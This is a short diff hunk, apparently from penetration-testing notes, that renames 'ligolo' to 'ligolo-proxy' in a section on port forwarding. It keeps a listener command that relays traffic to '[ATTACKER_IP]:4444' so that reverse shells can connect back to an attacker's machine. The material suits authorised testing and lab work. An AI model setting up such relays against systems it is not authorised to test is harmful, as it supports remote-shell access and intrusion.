@@ -44,7 +44,7 @@ If cert issues:
 # Port Forwarding
 If revshells or tools need to connect back to the attacker device, a port forward is required...
 
-On ligolo:
+On ligolo-proxy:
 ```
 listener_add --addr 0.0.0.0:1234 --to [ATTACKER_IP]:4444
 ```
